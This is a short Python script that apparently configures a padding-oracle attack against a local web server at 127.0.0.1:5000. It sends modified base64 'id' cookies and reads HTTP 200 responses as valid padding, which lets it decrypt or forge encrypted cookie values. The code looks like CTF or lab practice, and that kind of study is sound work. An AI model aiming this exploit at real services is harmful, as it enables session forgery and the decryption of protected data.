from h11 import Data
from numpy import byte
from padding_oracle_attack import payload_model
import grequests
from requests import Request, Response, get
from grequests import request
from base64 import b64decode,b64encode

class payload(payload_model):
    def padding_ok(self, resp:Response) -> bool:
        if resp.status_code == 200:
            return True
        else:
            return False

    def recover_fake_data(self, req:Request, fake_datas):
        for fake_data in fake_datas:
            if b64encode(bytes.fromhex("39af74cb5b64cac659b4e9e6a19c15c124d9ce4c5ff4b4497b86caac41c0316c") + fake_data).decode() == req._cookies.get("id"):
                return fake_data
        return None

    def make_request(self, fake_data) -> request:
        id = b64encode(bytes.fromhex("39af74cb5b64cac659b4e9e6a19c15c124d9ce4c5ff4b4497b86caac41c0316c") + fake_data).decode()
        cookies = {
                "id": id
        }
        return request("get", "http://127.0.0.1:5000/fuck", cookies=cookies)

if __name__ == "__main__":
    exp = b"test"
    m = payload(bytes.hex(exp),fake=True)
    m.run()